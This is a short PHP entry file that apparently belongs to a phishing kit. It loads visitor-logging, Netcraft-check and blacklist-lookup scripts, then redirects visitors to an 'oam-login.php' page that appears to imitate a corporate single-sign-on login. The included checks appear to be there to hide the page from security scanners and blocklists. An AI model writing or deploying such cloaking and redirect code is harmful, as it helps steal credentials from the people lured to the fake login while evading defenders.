<?php
date_default_timezone_set('UTC');

require "scripts/visitor_log.php";
require "scripts/netcraft_check.php";
require "scripts/blacklist_lookup.php";

@header("Location: oam-login.php");

?>